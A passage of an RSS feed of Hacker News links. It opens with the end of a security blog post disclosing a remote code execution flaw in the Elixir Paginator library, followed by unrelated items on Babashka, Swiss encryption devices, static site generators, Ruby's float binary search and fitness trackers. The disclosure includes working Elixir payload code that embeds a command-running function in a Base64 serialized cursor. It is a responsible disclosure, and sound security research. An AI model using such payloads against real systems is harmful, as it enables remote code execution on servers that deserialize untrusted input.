<p>The string <code>g2wAAAACbQAAABBBZXJvbWlzdC1LaGFya2l2bQAAAB=</code> is a Base64 encoded binary serialized Erlang term (ETF).
Such an Erlang term can contain anything from simple string values to full-blown functions containing almost any code you’d like.
However, in normal Erlang such a function provided in the payload would not be executed automatically (at least if nobody explicitly calls that function).
In Elixir there’s a much higher chance that such a function is executed later down the road, thanks to the Enumerable protocol of Elixir.</p>

<h2 id="exploits">Exploits</h2>

<p>To demonstrate this vulnerability I created two exploits.
The first one starts <code>xcalc</code>:</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_start_xcalc</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>System</span><span>.</span><span>cmd</span><span>(</span><span>"</span><span>xcalc"</span><span>,</span> <span>[]);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The second one prints the stacktrace (so we see where our anonymous function has been triggered):</p>

<figure><pre><code data-lang="elixir"><span>defp</span> <span>rce_print_stacktrace</span><span>()</span> <span>do</span>
    <span>exploit</span> <span>=</span> <span>fn</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span>  <span>IO</span><span>.</span><span>inspect</span><span>(</span><span>Process</span><span>.</span><span>info</span><span>(</span><span>self</span><span>(),</span> <span>:current_stacktrace</span><span>),</span> <span>label:</span> <span>"</span><span>RCE STACKTRACE"</span><span>);</span> <span>{</span><span>:cont</span><span>,</span> <span>[]}</span> <span>end</span>
    <span>payload</span> <span>=</span>
    <span>exploit</span>
    <span>|&gt;</span> <span>:erlang</span><span>.</span><span>term_to_binary</span><span>()</span>
    <span>|&gt;</span> <span>Base</span><span>.</span><span>url_encode64</span><span>()</span>
<span>end</span></code></pre></figure>

<p>The functions above create a Base64 encoded exploit payload (same as the cursors used by Paginator).
However, they do not include information about the whereabouts of the cursor, but instead contain an anonymous function that we want the server to execute.
(An attacker would execute this functions above on his side, only providing the Base64 encoded payload to an API using Duffel’s Paginator.)</p>

<p>The stacktrace output of the second exploit payload looked like this (when executed from a unit test):</p>

<figure><pre><code data-lang="text">......RCE STACKTRACE: {:current_stacktrace,
[
{Process, :info, 2, [file: 'lib/process.ex', line: 767]},
{PaginatorTest, :"-rce_print_stacktrace/0-fun-0-", 2,
    [file: 'test/paginator_test.exs', line: 945]},
{Stream, :do_zip_next_tuple, 5, [file: 'lib/stream.ex', line: 1191]},
{Stream, :do_zip, 3, [file: 'lib/stream.ex', line: 1168]},
{Enum, :zip, 1, [file: 'lib/enum.ex', line: 2820]},
{Paginator.Ecto.Query, :filter_values, 4,
    [file: 'lib/paginator/ecto/query.ex', line: 43]},
{Paginator.Ecto.Query, :maybe_where, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 103]},
{Paginator.Ecto.Query, :paginate, 2,
    [file: 'lib/paginator/ecto/query.ex', line: 12]},
{Paginator, :entries, 4, [file: 'lib/paginator.ex', line: 325]},
{Paginator, :paginate, 4, [file: 'lib/paginator.ex', line: 180]},
{PaginatorTest,
    :"test paginate a collection of payments, sorting by charged_at sorts ascending with before cursor",
    1, [file: 'test/paginator_test.exs', line: 78]},
{ExUnit.Runner, :exec_test, 1, [file: 'lib/ex_unit/runner.ex', line: 355]},
{:timer, :tc, 1, [file: 'timer.erl', line: 166]},
{ExUnit.Runner, :"-spawn_test_monitor/4-fun-1-", 4,
    [file: 'lib/ex_unit/runner.ex', line: 306]}
]}</code></pre></figure>

<p>This stacktrace reveals that the exploit function was triggered on <a href="https://github.com/duffelhq/paginator/blob/6f27a391d393924577d0e91d7a07c2dce89bac1d/lib/paginator/ecto/query.ex#L43">line 43 of query.ex</a> by the function <code>Enum.zip</code>:
our anonymous function is implicitly called by Elixir (thanks to the Enumerable protocol).</p>

<h2 id="additional-information">Additional information</h2>

<p>This is not the first time a vulnerability caused by the use of <code>binary_to_term</code> in combination with untrusted data has been found.
<a href="https://twitter.com/griffinbyatt">Griffin Byatt</a> probably discovered the first publicly known:
<a href="https://blog.voltone.net/post/10">Code execution through the session cookie</a> in the popular
and widely used Elixir <a href="https://hexdocs.pm/plug/readme.html">Plug</a>.</p>

<p>The Security Working Group of the Erlang Ecosystem Foundation has some recommendations regarding <a href="https://erlef.github.io/security-wg/secure_coding_and_deployment_hardening/serialisation">Serialisation and deserialisation</a>
including recommendations for mitigations.</p>

<div>
      
      <p>
        The official <a href="https://erlang.org/doc/man/erlang.html#binary_to_term-1">Erlang documentation</a> does "warn" about <code>binary_to_term/1</code>, and recommends <code>binary_to_term/2</code>.
        However, using <code>binary_to_term/2</code> is not a protection against the code execution shown here (especially not in Elixir). In fact the paginator library used <code>binary_to_term/2</code> with the <code>safe</code> option.
        Using <code>binary_to_term/2</code> with the <code>safe</code> option only protects against certain Denial of Service attacks.
      </p>
</div>

<h2 id="thanks">Thanks</h2>

<p>Thanks are in order for Duffel (the maintainers of this project):</p>
<ul>
  <li>Firstly: Duffel fixed the vulnerability in <b>less than one day</b> and acted very professionally throughout the process.</li>
  <li>Secondly: Despite not having a bug bounty program, Duffel payed a bounty of 1000 GBP, which I donated in parts to a
fund providing help for victims of the explosion in the port of Lebanon.</li>
</ul>

      </div></div>]]>
            </description>
            <link>https://www.alphabot.com/security/blog/2020/elixir/Remote-code-execution-vulnerability-in-Elixir-based-Paginator-project.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25227779</guid>
            <pubDate>Fri, 27 Nov 2020 11:30:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure Babashka scripting notebook]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25227419">thread link</a>) | @Borkdude
<br/>
November 27, 2020 | http://nextjournal.com/try/babashka?cm6=1 | <a href="https://web.archive.org/web/*/http://nextjournal.com/try/babashka?cm6=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div data-reactroot=""><p><span><div><p data-testid="paragraph">Play with the new Babashka pREPL.</p><div data-id="34f2db75-0d8e-49a7-9073-4ec603824768" data-collapsed="false"><div><div><div><div><div><pre><span><span>{</span><span>:hello</span> <span>(</span><span>System/getProperty</span> <span>"babashka.version"</span><span>)</span><span>}</span></span></pre></div></div></div></div><div><div><div></div><div><svg style="width:16px;height:16px"><use xlink:href="#CheckmarkBold"></use></svg><p><span><span>0.1s</span></span></p></div><div><div><p><span>Clojure</span></p><div><p><a target="_blank">→</a></p></div></div></div></div></div></div><div><div><div id="result-34f2db75-0d8e-49a7-9073-4ec603824768" tabindex="0"><div><div><div></div></div><p><span><span><span>Map</span></span><span>{</span><span><span><span>:hello</span>: </span><span>"<!-- -->0.2.4<!-- -->"</span></span><span>}</span></span></p></div></div></div></div></div></div></span></p><p><h5><svg style="width:20px;height:20px"><use xlink:href="#TriangleRight"></use></svg>Runtimes (1)</h5></p></div></div></div></div>]]>
            </description>
            <link>http://nextjournal.com/try/babashka?cm6=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25227419</guid>
            <pubDate>Fri, 27 Nov 2020 10:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Omnisec the second Swiss company that sold manipulated encryption devices]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25227182">thread link</a>) | @nix23
<br/>
November 27, 2020 | https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432 | <a href="https://web.archive.org/web/*/https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<div>
<div>
<figure>
<picture>
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/880/587/a683e845a8c9bdb270a5b635dfc947ed/gO/omnisec.jpg" media="(min-width: 900px)">
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/580/387/a683e845a8c9bdb270a5b635dfc947ed/Gx/omnisec.jpg" media="(min-width: 321px)">

</picture>
<figcaption>
Omnisec is the second Swiss company that allegedly sold manipulated encryption devices to US intelligence services. <span>Keystone / Walter Bieri</span>
</figcaption> </figure>
</div>
</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>
<span>This content was published on November 26, 2020 - 11:34</span>
<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>
</div></div>]]>
            </description>
            <link>https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432</link>
            <guid isPermaLink="false">hacker-news-small-sites-25227182</guid>
            <pubDate>Fri, 27 Nov 2020 10:03:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I Built My Own Shitty Static Site Generator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25227181">thread link</a>) | @mpweiher
<br/>
November 27, 2020 | https://erikwinter.nl/articles/2020/why-i-built-my-own-shitty-static-site-generator/ | <a href="https://web.archive.org/web/*/https://erikwinter.nl/articles/2020/why-i-built-my-own-shitty-static-site-generator/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
      
      <time datetime="2020-11-09 00:00:00">November 9, 2020</time>
      <p>On the internet, there is no shortage of good quality <a href="https://jamstack.org/generators/">static site generators</a> (SSGâ€™s) that you can download for free. <a href="https://gohugo.io/">Hugo</a>, <a href="https://jekyllrb.com/">Jekyll</a>, and hundreds of others are readily available. And they work. You can build all kinds of sites with them. I know that, because Iâ€™ve used some of them. Hugo was the driving force behind this website until very recently. Despite that, when I tried to add a new section a while ago, I got rather frustrated with it and decided to build my own generator. It turned out to be a very pleasant experience and not just because I like to program things.</p>
<p>While working on it, I discovered some of the deeper motivations that drove me to undertake this project. On the surface it would seem an odd thing to do, because it takes a lot of time and it appears to offer little benefit. I did not create any new or spectacular functionality. If you click around this site and think: Hey, but I could totally make this with &lt;SSG of choice&gt;, then you would probably be right. But that is not the point. There are certain advantages to making it all yourself and I suspect that these advantages trancend the subject of SSGâ€™s and programming. My speculation is that exploring this direction might also be interesting for people who do not like to program, or maybe even for those who donâ€™t like computers that much at all.</p>
<p>So, why choose this project out so many others that all sound so much more interesting? It is easy to summarize, but without some context it may sound a bit abstract. The real reason for all this work is that I think that a personal site should be personal and to make it personal, one should solely be guided by oneâ€™s intuition and not by the mental models of available tools and the restrictions they impose on your thoughts.</p>
<p>That probably sounded vague and perhaps a little far fetched. After all, as long as you can write the words you want to write, draw the lines you want to draw, you are not limited in your creativity, right? Maybe you are. To make the point more tangible, let me expand on my own situation for a bit. I wil focus on Hugo, since that is the SSG I know best. But the same principles hold for other generators. All other tools even, I believe.</p>
<h2>Metadata and Organising Thoughts</h2>
<p>As said, the list of available static site generators is endless. But somehow they all seem to focus on <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> as markup language to write your posts in. Markdown is very easy to learn and that is probably the reason why it is so popular. Unfortunately, it is a pretty bad markup language for this use case, as it is very incomplete. It is not really a language. Markdown is better seen as a bunch of shortcuts to simplify writing a few common HTML tags. Out of the box you can only sort of markup the body of a document with it. Titles, paragraphs, lists, etc. But not more than that. As we are dealing with a website, shortcuts for HTML tags can be useful, but we need more. For instance, one also needs metadata, like tags, publishing dates, etc. You do want the latest post to be at the top of the newsfeed, right? Then we must find a way to indicate the time when a post was published.</p>
<p>In Hugo this is solved with the awkward concept of <a href="https://gohugo.io/content-management/front-matter/">frontmatter</a>. At the top of each Markdown file, one needs to add a block of text that is not Markdown, but another format. You can pick either YAML, TOML, or JSON. In that block you can specify the things I mentioned. Publishing date, author, category, etc. It is all very flexible, you can even define your own metadata. So you can definitely make a nice looking site out of this.</p>
<p>But the downside is that any blog or article you write is now tied to the system that you use to publish it. Frontmatter is not part of Markdown. It is part of Hugo. So other Markdown tools will not be able to extract that info. Only Hugo can. So if you, like me, like to write all kinds of things, and you want to have some of your writings to end up on your site and others not, a decision that is perhaps made even only after youâ€™ve done the writing, then you have just created a problem. Because now you have to make two piles of writing. One pile for texts that will be published on your site, and another for text that you want to export to, say, PDF. But wait, maybe you <em>also</em> want to compile a selection of your stories and make it into an ebook. And maybe you are really proud of a piece and you want to publish it all three ways at once. It becomes a bit weird, and also very impractical, to store your work then. Are you going to change the document format each time you want to make an export? Are you going to make multiple copies? What happens if you find a spelling error later? This all quickly becomes a big mess.</p>
<p>Ideally, I want to have one folder for storing all my writing. I want to organize that folder the way I think fits best with the content. Then I want to point the site generator to that folder and it should figure out the rest by itself. What needs to be published on my site? Where should it end up? The metadata should be all that is needed to figure it out. And I want the same thing to be true for all other publishers, generators, indexers, etc. that I use, or may want to use in the future. The only solution is then to store your texts in open, tool agnostic document format that can hold all the relevant info. Preferably a plain text format too. Because that part of Markdown I do like. Using simple text editors, Git version control, yes, give me that.</p>
<p>Enter <a href="https://asciidoc.org/">Asciidoc</a>. A Markdown so structured and complete that you can write a whole book in it. Yet is has the same simple way of adding markup and it looks very similar. I will write another post later on how I used a subset of Asciidoc to make my generator. The point I want to make here is that a simple, in my opinion very reasonable requirement to not want to be forced to reorganise and duplicate my files in an illogical way, already rules out 90% of the available tools. And, conversely, that merely by adopting one of those existing tools, you have suddenly become a bit restricted in the way you can think about your creative work.</p>
<p>Think about it. The moment you start anything, the moment where the ideas in your head are not more than undefined glimpses of images or feelings. The moment you have to concentrate really hard to not let the fleeting, still wordless impressions slip. Blink your eyes one time too many and they will be lost, floated away. On <em>that</em> very moment, you get bothered by the question â€œWhere should this end up, once it is finished? Is it a note for my diary, or a book?â€�  That is totally backwards. That should not be the first question about your work, but the last. Not everyone is the same, but for me this upfront question is limiting. Thoughts that are not mature enough to be categorized, are forced to materialize in anyway, so you can put them in the right bucket. And then they slip away.</p>
<h2>Blank Page Instead of Puzzles and Pieces</h2>
<p>By now, some pepole might be thinking: yes, that is all fine, but some generators, like Hugo <em>can</em> use Asciidoc as input and you <em>can</em> set an alternative content path. Surely you can work something out here and configure things the way it suits you?</p>
<p>Well, yes, from the face of it, it might be possible to cobble something up. But that is not going to end up well. Going that route, you will get dragged down in an endless cycle of figuring out options and options of options and in the end, you will be happy to get anything on the screen at all.</p>
<p>Letâ€™s start simple. Some generators say they support Asciidoc, but they donâ€™t do that nativly. At least the ones Iâ€™ve seen. That is, you have to install another piece of software to get the functionality. In this case <a href="https://asciidoctor.org/">Asciidoctor</a>. (And Asciidocter in turn requires Ruby, but I think it ends there.) Then the two pieces must be configured to work together and this must be done on overy device you want to use. This is what developers call a dependency and they are to be avoided wherever possible, as they require you to do work, just to keep things running as they are. At the time of writing you can read <a href="https://gohugo.io/content-management/formats/#additional-formats-through-external-helpers">this</a> in the Hugo documentation on how to configure Asciidoc:</p>
<p><em>â€œAsciiDoc implementation EOLs in Jan 2020 and is no longer supported. AsciiDoc development is being continued under Asciidoctor. The format AsciiDoc remains of course. Please continue with the implementation Asciidoctor.â€�</em></p>
<p>So what this says is that the people behind Hugo saw that a piece of software they relied on, AsciiDoc, was going to be outdated so they switched to another piece of external software, Asciidoctor, to prevent things from breaking. A sensible move. But for you, the user, things are now already broken, because now you have remove the first piece of software, install the second, and configure things again to make them work together. And again, this must be done on all your devices. You get to choose between options, but the options are not stable and require work by you, the user. Sometimes the options have some dependencies themselves, repeating the problem. Not a fun way to spend an afternoon.</p>
<p>But enough about Asciidoc. Letâ€™s talk about templates.</p>
<p>It is wellknown that Hugo has a difficult templating language. This is because Hugo is built in Go and leverages the <a href="https://golang.org/pkg/html/template/">template functionality</a> of the Go standard library. That functionality is fast and elegant, but very much geared to programmers. I knew this beforehand, but since I am a Go developer, I figured this would be an advantage, not a disadvantage. I do this Go stuff all day. It has payed for the laptop I am writing on right now and the chair I am sitting in. Surely this will be easy?</p>
<p>Not so much. Writing Hugo templates turned out to be a moderately frustrating experience. It was an endless game of guessing variables, types and trying to combine them into something useful by chaining functions. There is documentation, every variable and function is listed, but a crucial thing is missing: the big …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://erikwinter.nl/articles/2020/why-i-built-my-own-shitty-static-site-generator/">https://erikwinter.nl/articles/2020/why-i-built-my-own-shitty-static-site-generator/</a></em></p>]]>
            </description>
            <link>https://erikwinter.nl/articles/2020/why-i-built-my-own-shitty-static-site-generator/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25227181</guid>
            <pubDate>Fri, 27 Nov 2020 10:03:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[1.5 is the midpoint between 0 and infinity in Ruby]]>
            </title>
            <description>
<![CDATA[
Score 235 | Comments 117 (<a href="https://news.ycombinator.com/item?id=25226941">thread link</a>) | @pimterry
<br/>
November 27, 2020 | https://blog.peterzhu.ca/ruby-range-bsearch/ | <a href="https://web.archive.org/web/*/https://blog.peterzhu.ca/ruby-range-bsearch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77
4.8915590244884904e+38
2.7093655358260904e+19
6375342080.0
97792.0
383.0
23.96875
95.8125
47.921875
31.96484375
39.92578125
43.923828125
41.9248046875
42.92431640625
42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>
            </description>
            <link>https://blog.peterzhu.ca/ruby-range-bsearch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226941</guid>
            <pubDate>Fri, 27 Nov 2020 09:29:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overview of Serialization Technologies (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25226937">thread link</a>) | @archagon
<br/>
November 27, 2020 | https://indico.cern.ch/event/658060/contributions/2898569/attachments/1622526/2582399/pivarski-serialization.pdf | <a href="https://web.archive.org/web/*/https://indico.cern.ch/event/658060/contributions/2898569/attachments/1622526/2582399/pivarski-serialization.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://indico.cern.ch/event/658060/contributions/2898569/attachments/1622526/2582399/pivarski-serialization.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226937</guid>
            <pubDate>Fri, 27 Nov 2020 09:28:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Science suggests fitness trackers might be ineffective]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25226897">thread link</a>) | @scottbucks
<br/>
November 27, 2020 | https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.5.0"><div dir="ltr"><div><h3 id="viewer-foo"><span><span>Is this wearable tech aimed at getting fit worth the money?</span></span></h3><div id="viewer-bs6e7"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/nsplsh_5637556f4d4e5773597367~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_5637556f4d4e5773597367~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-5i3uf"><span>Nowadays, one in five Americans owns a fitness tracker like a Fitbit, Garmin, Xiaomi Mi Band, <a href="https://www.thedetechtor.com/post/apple-event-september-2020-everything-you-need-to-know" target="_blank" rel="noopener"><u>Apple Watch</u></a> or other similar devices. People love the idea of a new gadget that they “need” to buy, in this case, to get fit, but the question of whether or not these devices actually work is definitely up for debate.</span></p><h3 id="viewer-1n80q"><span><strong>What science is saying</strong> </span></h3><p id="viewer-at776"><span>There have been several studies that have discovered that fitness trackers won't necessarily help you get fit faster than simply doing it on your own.</span></p><p id="viewer-e71cl"><span>In 2016, the <a href="https://jamanetwork.com/journals/jama/article-abstract/2553448" target="_blank" rel="noopener"><u>Journal of the American Medical Association (JAMA)</u></a> published a 2-year study from the University of Pittsburgh, aimed at comparing “technology-enhanced weight loss” (with the use of fitness trackers) to “standard behavioural weight loss” (without trackers).</span></p><p id="viewer-9t0rj"><span>Over 24 months, 470 adults participated in the study (233 in the standard group, 237 in the enhanced group). The results determined that the group using smart trackers didn't lose as much weight as the group without (3.5 kg vs 5.9kg).</span></p><div id="viewer-87lfu"><a href="https://jamanetwork.com/journals/jama/article-abstract/2553448" target="_blank" rel="noopener"><div data-hook="imageViewer"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/f361a8_6caae631dc4d4a07aaaad9f8cc6fbbef~mv2.png/v1/fit/w_1000%2Ch_958%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/f361a8_6caae631dc4d4a07aaaad9f8cc6fbbef~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></a></div><p id="viewer-50v8p"><span>Later a second study, published in <a href="http://www.thelancet.com/journals/landia/article/PIIS2213-8587(16)30284-4/abstract" target="_blank" rel="noopener"><u>The Lancet Diabetes &amp; Endocrinology</u></a><u>,</u> also showed that trackers didn’t help people move more, or get healthier.</span></p><p id="viewer-428pi"><span>Researchers at Duke-National University of Singapore Medical School challenged 800 workers with a target of 70,000 steps per week for 1 year. One group was given Fitbit Zips and another group Zips plus a cash bonus each week they hit their step goals. The control group got nothing except simple encouragement to walk more!</span></p><h3 id="viewer-3kq62"><span><span>Suggested Articles:</span></span></h3><ul><li id="viewer-3umal"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" 